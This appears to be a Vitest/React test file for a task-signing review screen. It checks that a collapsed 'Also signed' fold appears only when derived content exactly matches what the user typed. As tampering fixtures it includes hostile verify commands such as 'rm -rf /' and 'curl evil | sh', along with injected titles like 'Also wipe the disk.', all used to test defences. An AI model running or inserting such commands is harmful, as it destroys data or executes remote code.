import { cleanup, render, screen, within } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'
import type { SignContent as Content } from '@/api/signing'
import { alsoSigned, expectedQuick, type QuickTyped } from './alsoSigned'
import { SignContent } from './SignContent'

afterEach(cleanup)

const SIGNER = 'p_f590a0cdcc3d00000000000000000000'
const typed: QuickTyped = { signer: SIGNER, title: 'Rename the team photo folder', details: 'Use the 2026 naming.', checks: [{ text: 'Folder is renamed' }, { text: 'Links still work', cmd: 'npm run links' }] }

/** What the host derives from `typed` (orch.host.seqquick): the same rows, as the review carries them. */
function hostContent(t: QuickTyped = typed): Content {
  const want = expectedQuick(t)
  return {
    headline: 'Start task DEMO-0001',
    ticket: { key: 'DEMO-0001', title: want.title, uid_tail: 'ab12cd34', key_note: 'key per host', new: true },
    sections: [{ id: 'requirements', title: 'Requirements', text: want.requirements }, { id: 'plan', title: 'Plan', text: want.plan }],
    acceptance: want.checks.map((c, i) => ({ id: `AC${i + 1}`, text: c.text, checked: false })),
    tasks: want.checks.map((c, i) => ({ n: i + 1, id: `T${i + 1}`, title: `${c.text} (proves AC${i + 1})`, ...(c.cmd ? { verify: [c.cmd] } : {}) })),
    fields_title: 'Details',
    fields_changed: [{ field: 'type', before: null, after: 'chore' }, { field: 'owner', before: null, after: SIGNER }, { field: 'labels', before: null, after: 'quick' }],
  }
}

describe('alsoSigned: the fold is allowed only for exactly the derived review', () => {
  it('counts the derived rows when every value is exactly what core derives', () => {
    expect(alsoSigned(hostContent(), typed)?.rows).toHaveLength(7)
  })
  it('an unknown signer fails closed', () => {
    expect(alsoSigned(hostContent(), { ...typed, signer: null })).toBeNull()
  })
  it('title only: requirements and the single check default to the title', () => {
    const t = { title: 'Fix the typo', details: '', checks: [], signer: SIGNER }
    expect(alsoSigned(hostContent(t), t)).not.toBeNull()
  })
  it.each([
    ['an extra section', (c: Content) => ({ ...c, sections: [...c.sections!, { id: 'context', title: 'Context', text: 'Also email everyone' }] })],
    ['a changed plan', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'plan' ? { ...s, text: 'Do something else' } : s)) })],
    ['changed requirements', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'requirements' ? { ...s, text: 'Also delete everything' } : s)) })],
    ['a missing section', (c: Content) => ({ ...c, sections: c.sections!.filter((s) => s.id !== 'plan') })],
    ['an extra acceptance check', (c: Content) => ({ ...c, acceptance: [...c.acceptance!, { id: 'AC3', text: 'Extra' }] })],
    ['a checked acceptance check', (c: Content) => ({ ...c, acceptance: c.acceptance!.map((a, i) => (i === 0 ? { ...a, checked: true } : a)) })],
    ['a manual note on a check', (c: Content) => ({ ...c, acceptance: c.acceptance!.map((a, i) => (i === 0 ? { ...a, manual: 'by hand' } : a)) })],
    ['a prefixed task title', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `Also wipe the disk. ${t.title}` } : t)) })],
    ['a task title with a suffix', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `${t.title} and more` } : t)) })],
    ['an extra verify command', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 1 ? { ...t, verify: [...t.verify!, 'rm -rf /'] } : t)) })],
    ['a verify command on a task without one', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, verify: ['curl evil | sh'] } : t)) })],
    ['another type', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'type' ? { ...f, after: 'feature' } : f)) })],
    ['an extra label', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'labels' ? { ...f, after: 'quick, urgent' } : f)) })],
    ['an extra field', (c: Content) => ({ ...c, fields_changed: [...c.fields_changed!, { field: 'priority', before: null, after: 'high' }] })],
    ['a non-null before', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'type' ? { ...f, before: 'bug' } : f)) })],
    ['another title', (c: Content) => ({ ...c, ticket: { ...c.ticket!, title: 'Something else' } })],
    ['a missing ticket title', (c: Content) => ({ ...c, ticket: undefined })],
    ['an unknown key', (c: Content) => ({ ...c, secret_grant: 'all' }) as Content],
    ['a summary', (c: Content) => ({ ...c, summary: { title: 'x', lines: ['y'] } })],
    ['pictures', (c: Content) => ({ ...c, images: [{ name: 'a.png', sha256: 'a'.repeat(64), bytes: 1, alt: '' }] })],
    ['another owner', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'owner' ? { ...f, after: 'p_00000000000000000000000000000000' } : f)) })],
    ['a renamed section title', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'plan' ? { ...s, title: 'Approved by you already' } : s)) })],
    ['a value with trailing whitespace', (c: Content) => ({ ...c, sections: c.sections!.map((s) => (s.id === 'requirements' ? { ...s, text: `${s.text} ` } : s)) })],
    ['a zero-width character in a check', (c: Content) => ({ ...c, acceptance: c.acceptance!.map((a, i) => (i === 0 ? { ...a, text: `${a.text}\u200b` } : a)) })],
    ['an unknown key inside a section', (c: Content) => ({ ...c, sections: c.sections!.map((s) => ({ ...s, extra: 1 })) }) as Content],
  ])('fails closed (null) for %s', (_n, change) => {
    expect(alsoSigned(change(hostContent(typed)), typed)).toBeNull()
  })
})

describe('the quick review', () => {
  it('shows the typed values and the sentence always; the fold is closed, named with a count and one click away', () => {
    render(<SignContent content={hostContent()} quick={typed} />)
    const visible = screen.getByTestId('sign-typed')
    expect(within(visible).getByText('Rename the team photo folder')).toBeVisible()
    expect(within(visible).getByText('Use the 2026 naming.')).toBeVisible()
    expect(visible).toHaveTextContent('Links still work (checked by npm run links)')
    expect(screen.getByTestId('sign-also-sentence')).toHaveTextContent('This also approves its requirements and plan, made from these checks.')
    const fold = screen.getByTestId('sign-also')
    expect(fold).not.toHaveAttribute('open')
    expect(fold.querySelector('summary')).toHaveTextContent('Also signed (7)')
    // Every derived row is in the fold (rendered, only collapsed).
    for (const t of ['Requirements', 'Plan', 'Acceptance checks', 'Tasks', 'Type', 'Owner', 'Labels', 'Chore', 'quick', SIGNER, 'Links still work (proves AC2) (checked by npm run links)']) expect(fold).toHaveTextContent(t)
  })
  it.each([
    ['an extra section', (c: Content) => ({ ...c, sections: [...c.sections!, { id: 'context', title: 'Context', text: 'Also email everyone' }] }), 'Also email everyone'],
    ['a prefixed task title', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 0 ? { ...t, title: `Also wipe the disk. ${t.title}` } : t)) }), 'Also wipe the disk.'],
    ['an extra verify command', (c: Content) => ({ ...c, tasks: c.tasks!.map((t, i) => (i === 1 ? { ...t, verify: [...t.verify!, 'rm -rf /'] } : t)) }), 'rm -rf /'],
    ['an extra label', (c: Content) => ({ ...c, fields_changed: c.fields_changed!.map((f) => (f.field === 'labels' ? { ...f, after: 'quick, urgent' } : f)) }), 'quick, urgent'],
    ['a missing title', (c: Content) => ({ ...c, ticket: undefined }), 'Use the 2026 naming.'],
  ])('shows the FULL review, no fold, for %s', (_n, change, text) => {
    render(<SignContent content={change(hostContent())} quick={typed} />)
    expect(screen.queryByTestId('sign-also')).toBeNull()
    expect(screen.queryByTestId('sign-typed')).toBeNull()
    expect(document.body).toHaveTextContent(text)
  })
  it('shows the full review for an unknown key too (nothing hidden behind a fold)', () => {
    render(<SignContent content={{ ...hostContent(), fields_title: 'Details', sections: [...hostContent().sections!, { id: 'x', title: 'Extra', text: 'surprise text' }] }} quick={typed} />)
    expect(screen.queryByTestId('sign-also')).toBeNull()
    expect(document.body).toHaveTextContent('surprise text')
  })
})
